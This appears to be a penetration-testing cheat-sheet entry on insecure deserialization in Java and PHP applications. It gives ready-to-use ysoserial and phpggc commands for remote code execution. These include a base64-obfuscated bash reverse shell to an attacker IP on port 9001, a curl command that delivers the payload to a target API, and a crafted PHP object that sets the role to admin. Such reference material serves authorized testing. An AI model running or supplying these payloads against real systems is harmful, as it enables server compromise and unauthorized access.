---
description: |
  Insecure deserialization attacks against Java and PHP applications — identify serialized data and generate exploit payloads for remote code execution.
command: |
  # Identify Java deserialization — look for these signatures
  # Base64-encoded Java object starts with:
  rO0AB

  # Hex-encoded Java object starts with:
  ac ed 00 05

  # Check HTTP responses/cookies for these patterns

  # ysoserial — generate Java deserialization payloads
  # CommonsCollections1 gadget chain
  java -jar ysoserial.jar CommonsCollections1 'ping -c 3 10.10.10.21' | base64

  # CommonsCollections5
  java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4yMS85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}' | base64

  # Try multiple gadget chains
  java -jar ysoserial.jar CommonsCollections1 'id'
  java -jar ysoserial.jar CommonsCollections3 'id'
  java -jar ysoserial.jar CommonsCollections5 'id'
  java -jar ysoserial.jar CommonsCollections6 'id'
  java -jar ysoserial.jar CommonsCollections7 'id'

  # Send serialized payload via curl
  curl -X POST http://10.10.10.27/api -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @payload.bin

  # PHP deserialization
  # Look for unserialize() calls with user input
  # Craft serialized PHP object:
  O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

  # PHP POP chain — trigger __destruct or __wakeup
  # Tool: phpggc for generating PHP gadget chains
  phpggc Laravel/RCE1 system 'id' -b
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - Deserialization
references:
  - https://github.com/frohoff/ysoserial
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests
---
